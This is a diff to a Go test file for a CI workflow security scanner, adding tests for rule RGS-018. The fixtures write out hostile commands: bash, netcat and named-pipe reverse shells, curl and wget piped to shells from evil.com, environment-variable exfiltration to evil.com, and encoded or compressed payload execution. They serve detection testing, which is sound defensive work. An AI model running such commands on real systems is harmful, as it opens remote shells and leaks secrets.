@@ -1,9 +1,11 @@
 package rules
 
 import (
+	"fmt"
 	"os"
 	"path/filepath"
 	"regexp"
+	"strings"
 	"testing"
 
 	"github.com/stretchr/testify/assert"
@@ -431,6 +433,206 @@ jobs:
 	}
 
 	require.NotEmpty(t, rgs018, "expected RGS-018 for JS eval of fromCharCode")
+}
+
+func TestRGS018_ReverseShell(t *testing.T) {
+	cases := []struct {
+		name    string
+		run     string
+		wantStr string
+	}{
+		{"bash /dev/tcp", `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`, "Bash reverse shell"},
+		{"netcat exec", `nc -e /bin/sh 10.0.0.1 4444`, "Netcat reverse shell"},
+		{"mkfifo pipe", `mkfifo /tmp/f; nc 10.0.0.1 4444 < /tmp/f | /bin/sh > /tmp/f`, "Named pipe reverse shell"},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			wf := mustParseWorkflow(t, ".github/workflows/ci.yml", fmt.Sprintf(`
+name: CI
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - run: %s
+`, tc.run))
+			engine := NewEngineWithDefaults()
+			findings := engine.Evaluate([]*parser.Workflow{wf})
+			var rgs018 []Finding
+			for _, f := range findings {
+				if f.RuleID == "RGS-018" {
+					rgs018 = append(rgs018, f)
+				}
+			}
+			require.NotEmpty(t, rgs018, "expected RGS-018 for %s", tc.name)
+			assert.Contains(t, rgs018[0].Evidence, tc.wantStr)
+		})
+	}
+}
+
+func TestRGS018_CurlPipeToShell(t *testing.T) {
+	cases := []struct {
+		name    string
+		run     string
+		wantStr string
+	}{
+		{"curl pipe bash", `curl -s https://evil.com/install.sh | bash`, "curl piped to shell"},
+		{"wget pipe bash", `wget -O- https://evil.com/payload | bash`, "wget piped to shell"},
+		{"curl pipe python", `curl https://evil.com/script.py | python3`, "curl piped to Python"},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			wf := mustParseWorkflow(t, ".github/workflows/ci.yml", fmt.Sprintf(`
+name: CI
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - run: %s
+`, tc.run))
+			engine := NewEngineWithDefaults()
+			findings := engine.Evaluate([]*parser.Workflow{wf})
+			var rgs018 []Finding
+			for _, f := range findings {
+				if f.RuleID == "RGS-018" {
+					rgs018 = append(rgs018, f)
+				}
+			}
+			require.NotEmpty(t, rgs018, "expected RGS-018 for %s", tc.name)
+			assert.Contains(t, rgs018[0].Evidence, tc.wantStr)
+		})
+	}
+}
+
+func TestRGS018_PowerShellEncoded(t *testing.T) {
+	wf := mustParseWorkflow(t, ".github/workflows/ci.yml", `
+name: CI
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - run: powershell -EncodedCommand ZQBjAGgAbwAgACIASABlAGwAbABvACIA
+`)
+	engine := NewEngineWithDefaults()
+	findings := engine.Evaluate([]*parser.Workflow{wf})
+	var rgs018 []Finding
+	for _, f := range findings {
+		if f.RuleID == "RGS-018" {
+			rgs018 = append(rgs018, f)
+		}
+	}
+	require.NotEmpty(t, rgs018, "expected RGS-018 for PowerShell encoded command")
+	assert.Contains(t, rgs018[0].Evidence, "PowerShell encoded")
+}
+
+func TestRGS018_PythonExecCompress(t *testing.T) {
+	cases := []struct {
+		name    string
+		run     string
+		wantStr string
+	}{
+		{"exec compile", `python3 -c "exec(compile(open('payload.py').read(),'<string>','exec'))"`, "exec(compile("},
+		{"exec zlib", `python3 -c "exec(zlib.decompress(b'...'))"`, "exec(zlib.decompress("},
+		{"dynamic zlib", `python3 -c "__import__('zlib').decompress(b'...')"`, "dynamic zlib import"},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			wf := mustParseWorkflow(t, ".github/workflows/ci.yml", fmt.Sprintf(`
+name: CI
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - run: %s
+`, tc.run))
+			engine := NewEngineWithDefaults()
+			findings := engine.Evaluate([]*parser.Workflow{wf})
+			var rgs018 []Finding
+			for _, f := range findings {
+				if f.RuleID == "RGS-018" {
+					rgs018 = append(rgs018, f)
+				}
+			}
+			require.NotEmpty(t, rgs018, "expected RGS-018 for %s", tc.name)
+			assert.Contains(t, rgs018[0].Evidence, tc.wantStr)
+		})
+	}
+}
+
+func TestRGS018_EnvExfiltration(t *testing.T) {
+	wf := mustParseWorkflow(t, ".github/workflows/ci.yml", `
+name: CI
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - run: env | curl -X POST -d @- https://evil.com/collect
+`)
+	engine := NewEngineWithDefaults()
+	findings := engine.Evaluate([]*parser.Workflow{wf})
+	var rgs018 []Finding
+	for _, f := range findings {
+		if f.RuleID == "RGS-018" {
+			rgs018 = append(rgs018, f)
+		}
+	}
+	require.NotEmpty(t, rgs018, "expected RGS-018 for env exfiltration")
+	assert.Contains(t, rgs018[0].Evidence, "exfiltration")
+}
+
+func TestRGS018_HexDecode(t *testing.T) {
+	wf := mustParseWorkflow(t, ".github/workflows/ci.yml", `
+name: CI
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "6563686f2068656c6c6f" | xxd -r -p | bash
+`)
+	engine := NewEngineWithDefaults()
+	findings := engine.Evaluate([]*parser.Workflow{wf})
+	var rgs018 []Finding
+	for _, f := range findings {
+		if f.RuleID == "RGS-018" {
+			rgs018 = append(rgs018, f)
+		}
+	}
+	require.NotEmpty(t, rgs018, "expected RGS-018 for hex decode to shell")
+	assert.Contains(t, rgs018[0].Evidence, "Hex decode")
+}
+
+func TestRGS018_CleanScriptsShouldNotTrigger(t *testing.T) {
+	wf := mustParseWorkflow(t, ".github/workflows/ci.yml", `
+name: CI
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          go build ./...
+          go test ./...
+          make install
+          docker build -t myapp .
+          curl -sSL https://install.python-poetry.org | python3 -
+          pip install -r requirements.txt
+`)
+	engine := NewEngineWithDefaults()
+	findings := engine.Evaluate([]*parser.Workflow{wf})
+	for _, f := range findings {
+		if f.RuleID == "RGS-018" {
+			// The poetry install line uses curl | python which IS suspicious
+			// and should trigger — that's a valid finding
+			if !strings.Contains(f.Evidence, "curl piped to Python") {
+				t.Errorf("unexpected RGS-018 finding: %s", f.Evidence)
+			}
+		}
+	}
 }
 
 // ---------------------------------------------------------------------------
